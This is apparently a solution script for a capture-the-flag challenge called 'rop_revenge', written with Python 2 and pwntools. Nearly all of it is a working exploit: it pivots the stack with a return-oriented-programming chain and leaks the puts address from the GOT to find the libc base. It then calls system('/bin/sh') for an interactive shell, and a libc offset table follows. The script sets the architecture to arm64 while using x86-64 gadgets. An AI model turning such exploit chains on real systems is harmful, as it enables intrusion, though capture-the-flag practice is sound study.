from pwn import *
host, port = "ctf.adl.csie.ncu.edu.tw", 11009
#p = remote(host, port)
p = process('./rop_revenge')
context.arch = 'arm64'

name_op = buffer_1 = 0x601080 + 0x220  #0x6011a0
buffer_2 = buffer_1 + 0x60 #0x601300

sleep(10)

pop_rdi = 0x00400743
leave_ret = 0x4006d4
pop_rsi_r15 = 0x00400741
pop_rbp = 0x00000000004005a5

puts_plt = 0x400500
puts_got = 0x601018
read_plt = 0x400520
read_source = 0x4006aa

payload = 'a' * 0x20
buf_content = payload + p64(name_op) + p64(leave_ret)
buffer_1_content = 'a' * 0x220 + flat([buffer_2, pop_rdi, puts_got, puts_plt, read_source])

#=============Start===================
print p.recv() #What your name?
p.sendline(buffer_1_content)

print p.recv()  # Hello....

p.send(buf_content)
print p.recvuntil('\n') 
puts_addr = u64(p.recvuntil('\n').strip().ljust(8, '\x00'))

base_addr = puts_addr - 0x6f5d0
#system = base_addr + 0x0000000000045380
system = base_addr + 0x452d0
#bin_sh = base_addr + 0x18c58b
bin_sh = base_addr + 0x18cc57
print hex(base_addr), hex(system), hex(bin_sh)

get_shell = flat([buffer_2-0xd0, pop_rdi, bin_sh, system, buffer_2-0x20, leave_ret
])

p.sendline(get_shell)
p.interactive()



"""
offset___libc_start_main_ret = 0x20830
offset_system = 0x0000000000045380
offset_dup2 = 0x00000000000f70c0
offset_read = 0x00000000000f69a0
offset_write = 0x00000000000f6a00
offset_str_bin_sh = 0x18c58b
offset_puts = 0x6f5d0
"""







